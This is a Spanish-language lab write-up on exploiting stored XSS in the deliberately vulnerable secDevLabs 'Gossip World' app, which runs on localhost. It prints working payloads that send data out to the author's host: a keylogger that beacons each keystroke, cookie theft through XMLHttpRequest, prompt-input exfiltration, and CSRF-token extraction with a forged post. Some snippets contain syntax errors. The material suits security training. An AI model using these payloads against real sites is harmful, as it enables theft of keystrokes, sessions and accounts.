---
layout: post
title: XSS SecDevLabs
date: 2023-05-05
description:
cover_id: img/articulos/xss-secdevlabs/xss-secdevlabs.png
fig-caption:
tags: []
---
___

<center><img src="/img/articulos/xss-secdevlabs/xss-secdevlabs.png" alt=""></center>

# Instalación

```null
git clone https://github.com/globocom/secDevLabs
```

```null
cd gossip-world
```

```null
make install
```

Esto creará un servicio que corre en el equipo local por el puerto 10007

```null
SecDevLabs: 👀  Your app is starting!
SecDevLabs: 👀  Your app is still starting... (---*----) 
SecDevLabs: 🔥  A7 - Gossip World is now running at http://localhost:10007
```

# Explotación

Lo primero que aparece es un panel de inicio de sesión

<img src="/img/articulos/xss-secdevlabs/1.png" alt="">

Creo dos usuarios con las siguientes credenciales:

```null
admin:admin123$!
rubbx:rubbx123$!
```

Inicio sesión como ```rubbx```. Puedo ver una nueva interfaz

<img src="/img/articulos/xss-secdevlabs/2.png" alt="">

El campo ```New gossip```es vulnerable a inyección XSS

<img src="/img/articulos/xss-secdevlabs/3.png" alt="">

Las etiquetas script no las interpreta si trato de cargar un elemento externo hasta que no abro el post

<img src="/img/articulos/xss-secdevlabs/4.png" alt="">

En una sesión de ```netcat``` recibo la petición

```null
nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.16.130] from (UNKNOWN) [192.168.16.130] 37628
GET /pwned.js HTTP/1.1
Host: 192.168.16.130
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: */*
Referer: http://localhost:10007/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

Creo un servicio HTTP con ```python``` por el puerto 80

```null
python3 -m http.server 80
```

Y un archivo ```pwned.js``` donde introduciré mi código JavaScript. Algo que se puede hacer es tratar de abrir una ventana emergente en la que el usuario introduzca su input

```null
var user_input = prompt("Ventana emergente", "Ejemplo de input")
```

<img src="/img/articulos/xss-secdevlabs/5.png" alt="">

Puedo además validar si el campo tiene contenido o está vacío. En caso contrario, se tramitará una petición a mi equipo con los datos

```null
if (user_input == null || user_input == ""){
    alert("Campo vacío");
} else {
    fetch("http://192.168.16.130:8080/?user_input=" + user_input);
}
```

Incluso se puede derivar a un Keylogger

```null
var characters = "";
document.onkeypress = function(event) {
    var character = event.key;

    characters += character;

    var image = new Image();
    image.src = "http://192.168.16.130/" + character;
};
```

Es posible redirigir un usuario a un sitio web

```null
window.location.href = "https://google.es";
```

Con respecto a las cookies, en caso de tener el ```HttpOnly``` en ```false```, se puede tratar de dumpear de la misma forma que antes al tramitar la petición, pero extrayéndola de  ```document.cookie```. Otra forma es utilizando XMLHttpRequest

```null
var request = New XMLHttpRequest();
var req = ('GET', 'http;//192.168.16.130/?cookie=' + document.cookie);
request.send();
```

Se puede derivar a un CSRF, para tramitar peticiones por GET o POST a algún elemento de la web como otro usuario. En este caso, se está arrastrando un CSRF token a la hora de crear una publicación, por lo que si quiero crear una a través de la inyección, tendría que obtenerlo

```null
title=test&subtitle=test&text=test&_csrf_token=9bddf12b-2445-4349-bf81-06af29147a4d
```

Se suele encontrar en un campo oculto en el código fuente

```null
curl -s -X GET http://localhost:10007/newgossip -H "Cookie: session=eyJfY3NyZl90b2tlbiI6IjliZGRmMTJiLTI0NDUtNDM0OS1iZjgxLTA2YWYyOTE0N2E0ZCIsInVzZXJuYW1lIjoicnViYngifQ.ZFU9eQ.-DuQJNNgO1NjTzUVJscv51nZe-E" | grep csrf | grep -oP '".*?"'
"_csrf_token"
"hidden"
"9bddf12b-2445-4349-bf81-06af29147a4d"
```

Lo extraigo desde la inyección XSS

```null
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open = ('GET', domain, false);
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value;

var req2 = new XMLHttpRequest();
req2.open('GET', 'http://192.168.16.130/?token=' + token);
req2.send();
```

Para crear el post se puede realizar de la siguiente forma:

```null
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.withCredentials = true;
req1.open = ('GET', domain, false);
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value;

var req2 = new XMLHttpRequest();
var data = "title=test&subtitle=test&text=test&_csrf_token=" + token;
req2.open('POST', 'http://localhost:10007/newgossip', false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);
```

